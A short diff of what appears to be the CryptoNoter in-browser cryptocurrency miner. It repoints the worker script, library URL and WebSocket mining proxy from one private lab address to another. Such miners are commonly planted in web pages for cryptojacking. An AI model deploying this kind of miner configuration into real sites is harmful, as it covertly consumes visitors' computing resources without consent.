@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "http://172.19.0.5/worker.js", true);
+            xhr.open("get", "http://172.19.0.3/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://172.19.0.5/lib/",
-    WEBSOCKET_SHARDS: [["ws://172.19.0.5/proxy"]]
+    LIB_URL: "http://172.19.0.3/lib/",
+    WEBSOCKET_SHARDS: [["ws://172.19.0.3/proxy"]]
 };
